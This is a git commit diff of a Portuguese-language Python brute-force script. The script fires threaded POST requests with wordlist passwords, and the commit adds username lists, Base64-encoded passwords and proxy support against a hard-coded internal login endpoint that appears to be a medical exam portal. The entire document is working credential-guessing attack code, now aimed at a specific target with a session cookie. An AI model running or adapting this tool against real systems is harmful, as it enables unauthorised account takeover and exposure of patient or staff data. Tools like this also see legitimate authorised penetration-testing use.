d4d8a85c5fcb9cc2d87d5191a9b50af72b251d2d
ackemed <bcamposti3@gmail.com>
2024-05-19 02:21:58 -0300

    Mudanças para usar lista de usuarios também

--- bc_bruteforce-web-login.py
+++ bc_bruteforce-web-login.py
@@ -1,83 +1,85 @@
-#!/usr/bin/env python3
-
-"""
-Script: bc_bruteforce-web-login.py
-Author: Bruno Campos
-Version: 1.0
-
-Descrição:
-Este é um script de Brute Force em formularios de login via POST, utilizando de multiplas requisições simultâneas.
-"""
-
+import argparse
+import base64
 import requests
 import threading
-import argparse
-import time  # Importe a biblioteca time para usar o método sleep
+import time
 import pyfiglet
+import sys
 
-# Função para enviar a requisição com username e uma senha da wordlist
-def enviar_requisicao(username, password):
-    # Os Campos abaixo em url, headers e payload devem ser alterados conforme sua requisição.
-    url = 'https://exemplo.com.br/auth/session' # << Altere sua url de envio de formulario aqui
+def enviar_requisicao(username, password, use_base64, proxy):
+    url = 'http://10.0.10.12:13700/api/v1.0/login/medico'
     headers = {
-        'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122"',
-        'Sec-Ch-Ua-Platform': '"Windows"',
-        'Sec-Ch-Ua-Mobile': '?0',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
-        'Content-Type': 'application/json',
-        'Accept': '*/*',
-        'Origin': 'https://exemplo.com.br',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Dest': 'empty',
-        'Referer': 'https://exemplo.com.br/login',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Priority': 'u=1, i'
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+            'Access-Control-Allow-Methods': 'GET, POST, PATCH, PUT, DELETE, OPTIONS',
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*',
+            'Accept': 'application/json',
+            'Access-Control-Allow-Headers': 'Origin, Content-Type, X-Auth-Token',
+            'Sec-GPC': '1',
+            'Accept-Language': 'en-US,en',
+            'Origin': 'http://10.0.10.12:13700',
+            'Referer': 'http://10.0.10.12:13700/login',
+            'Cookie': '__cookies_mv_portal_de_exames_2023.004.09={"token":"45.175.118.117"}; patient-user-login=0'
     }
+    # Codificar o valor do parâmetro senha em Base64 se a opção --base64=senha for fornecida
+    if use_base64 == 'senha':
+        password = base64.b64encode(password.encode()).decode()
     payload = {
-        "username": username,
-        "password": password
+            "usuario": username,
+            "senha": password
+    }
+    proxies = {
+        'http': proxy,
+        'https': proxy
     }
     try:
-        response = requests.post(url, headers=headers, json=payload)
+        response = requests.post(url, headers=headers, json=payload, proxies=proxies)
         print(f'Status para usuário {username} e senha {password}: {response.status_code}')
     except Exception as e:
         print(f'Erro ao enviar requisição para usuário {username} e senha {password}: {e}')
 
-# Função para enviar lotes de requisições em threads
-def enviar_lotes_requisicoes(username, passwords, num_threads, delay_lote=None):
-    lote_size = num_threads  # Define o tamanho do lote igual ao número de threads
+def enviar_lotes_requisicoes(username, passwords, num_threads, delay_lote=None, use_base64=None, proxy=None):
+    lote_size = num_threads
     num_passwords = len(passwords)
     for i in range(0, num_passwords, lote_size):
-        lote_passwords = passwords[i:i + lote_size]  # Divide as senhas em lotes
+        lote_passwords = passwords[i:i + lote_size]
         threads = []
         for password in lote_passwords:
-            thread = threading.Thread(target=enviar_requisicao, args=(username, password))
+            thread = threading.Thread(target=enviar_requisicao, args=(username, password, use_base64, proxy))
             threads.append(thread)
             thread.start()
 
-        # Aguarda todas as threads terminarem
         for thread in threads:
             thread.join()
 
-        # Aguarda um atraso entre os lotes, se um atraso for especificado
         if delay_lote and i + lote_size < num_passwords:
             time.sleep(delay_lote)
 
 if __name__ == "__main__":
-    # Transformar o nome em banner com pyfiglet
     banner_text = pyfiglet.figlet_format("ACKEMED")
     print(f'CreateBy \n{banner_text}                             (Bruno Campos)\n\n')
 
     parser = argparse.ArgumentParser(description='BC Brute Force WEB Login - Envia requisições POST com uma lista de senhas.')
     parser.add_argument('-w', '--wordlist', type=str, help='Caminho para a wordlist contendo as senhas.', required=True)
     parser.add_argument('-t', '--num_threads', type=int, help='Quantidade de threads para enviar as requisições em cada lote.', required=True)
-    parser.add_argument('-u', '--username', type=str, help='Nome de usuário para enviar as requisições.', required=True)
+    parser.add_argument('-u', '--username', nargs='?', type=str, help='Nome de usuário para enviar as requisições.', const=None)
+    parser.add_argument('-U', '--userlist', type=str, help='Caminho para o arquivo contendo uma lista de usuários.', default=None)
     parser.add_argument('-d', '--delay', type=float, help='Atraso entre os lotes de requisições (segundos).', default=None)
+    parser.add_argument('--base64', type=str, help='Parâmetro(s) a ser(em) codificado(s) em Base64. Ex: --base64=senha', default=None)
+    parser.add_argument('-p', '--proxy', type=str, help='Endereço do proxy a ser usado para todas as requisições.', default=None)
     args = parser.parse_args()
+
+    if args.userlist:
+        with open(args.userlist, 'r') as user_file:
+            usernames = [line.strip() for line in user_file.readlines()]
+    elif args.username:
+        usernames = [args.username]
+    else:
+        print("Você deve fornecer um único usuário (-u) ou uma lista de usuários (-U).")
+        sys.exit(1)
 
     with open(args.wordlist, 'r') as file:
         passwords = [line.strip() for line in file.readlines()]
 
-    enviar_lotes_requisicoes(args.username, passwords, args.num_threads, args.delay)
+    for username in usernames:
+        enviar_lotes_requisicoes(username, passwords, args.num_threads, args.delay, args.base64, args.proxy)
